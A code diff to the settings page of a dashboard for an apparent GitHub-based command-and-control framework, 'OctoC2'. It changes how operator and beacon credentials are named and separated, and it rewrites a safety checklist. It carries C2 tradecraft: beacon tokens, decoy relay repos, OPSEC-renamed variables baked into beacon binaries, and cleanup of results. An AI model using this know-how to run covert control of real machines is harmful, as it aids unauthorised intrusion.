@@ -25,7 +25,7 @@ function Row({ label, value }: { label: string; value: string }) {
 // ── Sections ──────────────────────────────────────────────────────────────────
 
 function ConnectionSection() {
-  const { mode, serverUrl, latencyMs, pat } = useAuth();
+  const { mode, serverUrl, latencyMs, operatorToken } = useAuth();
   const modeLabel =
     mode === 'live' ? `live (${latencyMs ?? '?'}ms)` : mode;
 
@@ -37,7 +37,7 @@ function ConnectionSection() {
   useEffect(() => {
     if (mode !== 'live') return;
     const ctrl = new AbortController();
-    void new C2ServerClient(serverUrl, pat).subscribeEvents((event: SSEEvent) => {
+    void new C2ServerClient(serverUrl, operatorToken).subscribeEvents((event: SSEEvent) => {
       if (event.type === 'beacon-update') {
         setLiveBeaconCount(event.beacons.length);
         setLastSseUpdate(new Date());
@@ -45,7 +45,7 @@ function ConnectionSection() {
       }
     }, ctrl.signal);
     return () => ctrl.abort();
-  }, [mode, serverUrl, pat]);
+  }, [mode, serverUrl, operatorToken]);
 
   // Tick seconds-ago counter
   useEffect(() => {
@@ -72,7 +72,7 @@ function ConnectionSection() {
       <div className="border border-octo-border rounded p-3 space-y-2">
         <Row label="Mode"           value={modeLabel} />
         <Row label="Server URL"     value={serverUrl} />
-        <Row label="Live beacons"   value={liveBeaconLabel} />
+        <Row label="Observed beacons" value={liveBeaconLabel} />
         <Row label="Last SSE update" value={lastSseLabel} />
       </div>
     </div>
@@ -115,24 +115,34 @@ function OperatorKeySection() {
 // Server/operator-side env vars (set on the machine running the C2 server)
 const OPSEC_VARS_SERVER: Array<{ name: string; desc: string; example: string }> = [
   {
-    name:    'OCTOC2_CLEANUP_DAYS',
-    desc:    'Delete result comments older than N days (0 = immediately)',
-    example: '3',
+    name:    'OCTOC2_SERVER_GITHUB_TOKEN',
+    desc:    'Server-only GitHub credential; never accepted by controller APIs',
+    example: 'github_pat_…',
   },
   {
-    name:    'OCTOC2_APP_ID',
-    desc:    'GitHub App ID (numeric) for App auth token rotation',
+    name:    'OCTOC2_OPERATOR_API_TOKEN',
+    desc:    'Operator credential for controller REST and SSE routes',
+    example: 'high-entropy token',
+  },
+  {
+    name:    'OCTOC2_BEACON_API_TOKENS',
+    desc:    'Per-beacon controller credentials keyed by full beacon ID',
+    example: '{"beacon-id":"token"}',
+  },
+  {
+    name:    'OCTOC2_GITHUB_APP_ID',
+    desc:    'Server-held GitHub App ID for narrowed installation leases',
     example: '123456',
   },
   {
-    name:    'OCTOC2_INSTALLATION_ID',
-    desc:    'GitHub App Installation ID for the C2 repo',
-    example: '987654',
+    name:    'OCTOC2_GITHUB_APP_PRIVATE_KEY_FILE',
+    desc:    'Path to the server-only App private key; never a beacon setting',
+    example: '/run/secrets/app.pem',
   },
   {
-    name:    'OCTOC2_PROXY_REPOS',
-    desc:    'JSON array of OctoProxy decoy repo configs',
-    example: '[{"owner":…}]',
+    name:    'OCTOC2_RECOVERY_POLICIES',
+    desc:    'Per-beacon signed recovery and proxy route policy',
+    example: '{"beacon-id":{…}}',
   },
 ];
 
@@ -149,14 +159,19 @@ const OPSEC_VARS_BEACON: Array<{ name: string; desc: string; example: string }> 
     example: '0.3',
   },
   {
-    name:    'SVC_APP_ID',
-    desc:    'GitHub App ID baked into beacon binary (OPSEC-renamed)',
-    example: '123456',
+    name:    'SVC_BEACON_API_TOKEN',
+    desc:    'Unique controller credential for this beacon',
+    example: 'high-entropy token',
   },
   {
-    name:    'SVC_INSTALLATION_ID',
-    desc:    'GitHub App Installation ID baked into beacon binary',
-    example: '987654',
+    name:    'SVC_GITHUB_TOKEN_LEASE',
+    desc:    'Short-lived repository-bound lease; renewed by signed recovery',
+    example: '{"version":1,…}',
+  },
+  {
+    name:    'OCTOC2_RECOVERY_REPO_OWNER / _NAME',
+    desc:    'Public deterministic recovery repository coordinates',
+    example: 'owner / recovery-repo',
   },
 ];
 
@@ -246,7 +261,7 @@ async function pushMonitoringPubkey(
 type PushState = 'idle' | 'pushing' | 'pushed' | 'error';
 
 function KeygenSection() {
-  const { pat } = useAuth();
+  const { githubPat } = useAuth();
   const { owner, repo } = getGitHubCoords();
 
   const [pubkey,    setPubkey]    = useState<string | null>(null);
@@ -289,7 +304,7 @@ function KeygenSection() {
     setPushState('pushing');
     setPushError(null);
     try {
-      await pushMonitoringPubkey(owner, repo, pat, pubkey);
+      await pushMonitoringPubkey(owner, repo, githubPat, pubkey);
       setPushState('pushed');
       if (pushTimerRef.current) clearTimeout(pushTimerRef.current);
       pushTimerRef.current = setTimeout(() => setPushState('idle'), 2000);
@@ -394,14 +409,14 @@ function KeygenSection() {
 // ── SafetyChecklistSection ────────────────────────────────────────────────────
 
 const SAFETY_ITEMS = [
-  'C2 repo is private',
-  'GitHub App auth (not PAT) configured',
-  'App private key delivered via dead-drop (not baked in binary)',
-  'OctoProxy relay active for target isolation',
-  'OCTOC2_CLEANUP_DAYS set to 3 or less',
-  'Dashboard not exposed publicly (local only)',
-  'PAT scope limited to repo only',
-  'E2E --fingerprint check passing',
+  'Confirm the controller and dashboard bind only to intended interfaces',
+  'Keep the operator API token separate from the GitHub PAT',
+  'Use a private, disposable repository with least-privilege credentials',
+  'Keep the dashboard on trusted loopback or a private test network',
+  'Treat recovery, relay, and alternate channels as unverified until tested',
+  'Run local tests and type checks for every changed workspace',
+  'Run live-secret E2E only through the manual approved workflow',
+  'Do not treat this checklist as proof of production readiness',
 ];
 
 function SafetyChecklistSection() {
@@ -413,7 +428,7 @@ function SafetyChecklistSection() {
       <div className="border border-octo-border rounded p-3 space-y-1">
         {SAFETY_ITEMS.map((item) => (
           <div key={item} className="flex items-start gap-2 text-xs font-mono text-gray-500">
-            <span className="text-green-600/70 shrink-0">✓</span>
+            <span className="text-amber-500/70 shrink-0">□</span>
             <span>{item}</span>
           </div>
         ))}
